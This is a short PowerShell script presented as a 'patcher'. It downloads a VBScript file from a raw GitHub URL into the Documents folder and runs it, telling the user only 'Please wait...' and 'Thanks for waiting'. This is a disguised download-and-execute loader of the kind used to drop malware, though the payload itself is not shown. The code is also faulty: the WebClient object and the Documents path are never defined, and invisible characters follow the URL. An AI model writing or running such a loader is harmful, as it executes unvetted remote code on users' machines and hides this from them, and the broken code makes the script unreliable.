# URL of your patcher
$exeUrl = "https://raw.githubusercontent.com/RollbakIsOnline/Puls/refs/heads/main/out.vbs"​​
$exePath = "$Documents\Out.vbs"
 
Write-Host "Please wait..." -ForegroundColor Cyan
 
# Create WebClient to download the file
$wc.DownloadFileAsync($exeUrl, $exePath)
 
# Wait until download is finished
while ($wc.IsBusy) {
    Start-Sleep -Milliseconds 200
}
 
# Verify file exists
if (Test-Path $exePath) {
    Write-Host "Thanks for waiting" -ForegroundColor Green
    Start-Process $exePath
} else {
    Write-Host "Download failed." -ForegroundColor Red
}